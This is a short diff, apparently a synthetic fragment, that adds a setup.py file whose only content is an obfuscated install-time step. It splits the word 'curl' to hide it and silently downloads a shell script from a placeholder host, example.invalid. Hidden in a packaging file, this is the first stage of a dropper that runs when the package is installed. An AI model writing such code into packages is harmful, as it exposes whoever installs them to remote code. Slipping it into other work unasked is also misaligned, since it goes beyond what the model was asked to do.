@@ -1,0 +1,7 @@
+# path: setup.py
+# lines: 3
+# weight: 35
+# ---
+import subprocess
+tool = "cu" + "rl"
+subprocess.run([tool, "-sO", "example.invalid/x.sh"])
